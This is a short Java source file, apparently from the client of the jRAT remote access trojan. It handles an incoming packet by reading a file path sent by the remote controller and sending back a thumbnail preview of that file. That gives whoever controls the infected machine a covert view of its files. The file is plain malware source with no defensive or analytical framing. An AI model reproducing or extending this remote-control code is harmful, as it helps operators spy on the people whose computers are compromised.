package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet59ThumbnailPreview;


public class Packet85ThumbnailPreview extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();

		con.addToSendQueue(new Packet59ThumbnailPreview(file));
	}

}
